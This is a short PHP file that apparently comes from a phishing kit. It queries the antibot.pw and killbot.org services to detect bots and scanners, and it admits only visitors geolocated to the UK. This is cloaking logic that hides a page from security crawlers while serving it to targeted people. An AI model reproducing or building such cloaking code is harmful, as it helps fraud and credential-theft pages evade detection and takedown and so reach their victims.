<?php
include 'conn.php';


function checkBot($apikey){
	$ip = $_SERVER['REMOTE_ADDR'];
	$url 		= "https://antibot.pw/api/v2-blockers?ip=$ip&apikey=$apikey&ua=".urlencode($_SERVER['HTTP_USER_AGENT']);
	$respons 	= sex($url);
	return json_decode($respons,true)['is_bot'];
}
function onlyUK(){
	$ip = $_SERVER['REMOTE_ADDR'];
	$req = json_decode(sex("https://antibot.pw/api/ip?ip=$ip"),true);
	if($req['countryCode'] == 'GB'){
		return true;
	}else{
		return false;
	}
}
function checkkillbot($apikey) {
    $ip         = $_SERVER['REMOTE_ADDR'];
    $respons    = sex("https://killbot.org/api/v2/blocker?ip=".$ip."&apikey=$apikey&ua=".urlencode($_SERVER['HTTP_USER_AGENT'])."&url=".urldecode($_SERVER['REQUEST_URI']));
    $json       = json_decode($respons,true);
    if($json['meta']['code'] == 200) {
        if($json['data']['block_access'] == true) {
            // blocked
            return true;
        } else {
            return false;
        }
    } else {
        if(!empty($json['meta']['message'])) {
            return false;
        } else {
            return false;
        }
    }
}
?>